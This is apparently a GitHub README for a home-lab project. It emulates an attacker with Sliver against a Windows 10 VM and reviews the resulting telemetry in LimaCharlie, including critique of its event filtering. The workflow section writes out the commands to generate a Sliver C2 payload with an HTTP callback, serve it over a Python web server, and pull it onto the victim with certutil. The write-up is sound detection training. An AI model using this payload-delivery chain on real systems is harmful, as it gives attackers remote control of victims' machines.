

  <h1>Project: Exploring Attack and Detection with Lima Charlie, Sigma, & Sliver</h1>

  <h2>Introduction</h2>
  <p>This  project focuses on the exploration of deploying and analyzing a cyber-attack scenario using Lima Charlie. The blog series, consisting of Part 1 and Part 2, provides detailed instructions and insights into the process. Part 1 covers the initial setup of the environment, including the installation of Sliver to emulate an attacker. Part 2 delves into the practical aspects of the attack, from creating a command and control (C2) payload to analyzing the system traffic in Lima Charlie.</p>

  <h2>Environment</h2>
  <p>The project utilizes the following setup for simulation:</p>
  <ul>
    <li>Attacker Machine: Linux Ubuntu Server</li>
    <li>Victim Machine: Windows 10</li>
    <li>Analysis Tool: Lima Charlie</li>
    <li>Attack Tool: Sliver</li>
    <li>Rule Creation Tool: Sigma</li>
  </ul>

  <h2>Lima Charlie Overview</h2>
  <p>Lima Charlie is introduced as a user-friendly cloud-based security tool that simplifies security monitoring without the need for complex integrations. Drawing comparisons with previous experiences in setting up ELK SIEM, the author notes the ease of Lima Charlie's setup and its convenience in filtering specific information.</p>

  <h2>Project Workflow</h2>
  <ol>
    <li><strong>Creating C2 Payload on Linux VM</strong>
      <ul>
        <li>Using Sliver on the Linux machine to generate a C2 session payload.</li>
        <li>Commands:
          <pre>
            sliver-server # starting the server
            generate --http [Linux_VM_IP] --save /opt/sliver # generating C2 session payload
          </pre>
        </li>
      </ul>
    </li>
    
  <li><strong>Transferring Payload and Executing on Windows</strong>
      <ul>
        <li>Setting up a Python server on Linux for payload transfer.</li>
        <li>Using PowerShell on Windows to download and execute the payload.</li>
        <li>Commands:
          <pre>
            python3 -m http.server 80 # start Python server
            certutil.exe -f -urlcache http://[Linux_VM_IP]/GERMAN_HEADLINE.exe german_headline.exe # transfer payload
          </pre>
        </li>
      </ul>
    </li>

  <li><strong>Upon closing the python server in the linux machine, we will now start the sliver-server to receive the call back.</strong>
      <ul>
        <li>Starting the server</li>
        <li>Setting up listener</li>
        <li>Commands:
          <pre>
            sliver-server 
            http
          </pre>
        </li>
      </ul>
    </li>

  <li><strong>Now time to go into Lima Charlie to see the noise!</strong>
      <ul>
        <li>Going into the sensors tab, I can see that my windows machine is online</li>
        <li>Viewing your sensor that was installed, I liked that you could isolate the device from the network at the click of a button. Containing the problem at such ease is great for response and which is a process I’m sure could be automated within Lima Charlie.</li>
        <li>You’ll also be able to see things like the private / public IP, mac address, etc</li>
        <li>You can also view the entire file system, the device network, and basically everything about the device while the Lima Charlie sensor is installed on the device that you want to monitor.</li>
      </ul>
    </li>

  <li><strong>Going into timeline we can see plenty of noise that’s happening on the system. Tracking our c2 instance, we can find the exact time that we downloaded and executed it</strong>
      <ul>
        <li>time it was downloaded then executed moments later when looking through logs</li>
        <li>One event was also labeled as SENSITIVE_PROCESS_ACCESS very close to the event of a network connection with the c2 server. This could be because of the enumeration of privileges we were doing and when running commands through sliver.</li>
      </ul>
    </li>

  <li><strong>All in all, there’s many different way to see and track down what is happening. Given we had the IP that the process was connecting to, we could have also filtered our search results with the malicious IP that we’re using to emulate an attacker.</strong>
      <ul>
        <li>Given there’s plenty of noise that happens in the background of a windows machine, it’s probably a good idea to get familiar with the native processes within windows in order to have a better understanding of what’s normal and what isn’t. This is some of the advice given in the blog post referenced at the very beginning of this post.</li>
        <li>If I had to give any constructive criticism, I’d say that filtering through all the events is a bit too much. I am used to working with a SIEM that allows you to filter for commands ran and having the option to only view events where a command ran exists.</li>
        <li>For example, when filtering for sensitive process access events, I had to scroll quite a bit in order to see that it was involved with our c2 instance.</li>
        <li>The scroll bar on the bottom shows I scrolled about halfway through. Given all the JSON formatted objects, it’s quite a bit to scroll through.</li>
        <li>But Lima Charlie is new to me so maybe after some tinkering, I’ll get used to it and learn all the tricks.</li>
      </ul>
    </li>
  </ol>

  <h2>Recommendations and Conclusion</h2>
  <p>The blog post concludes with recommendations for analysts, emphasizing the importance of understanding native Windows processes to distinguish between normal and malicious activities. Constructive criticism is provided regarding event filtering in Lima Charlie, with potential improvements suggested for enhancing user experience.</p>

  <p>Feel free to refer to the original blog series for a detailed walkthrough and further insights.</p>

  <hr>

  <p><em>Note: This README provides an overview of the GitHub project structure and content. Refer to the original blog series for detailed instructions and insights.</em></p>
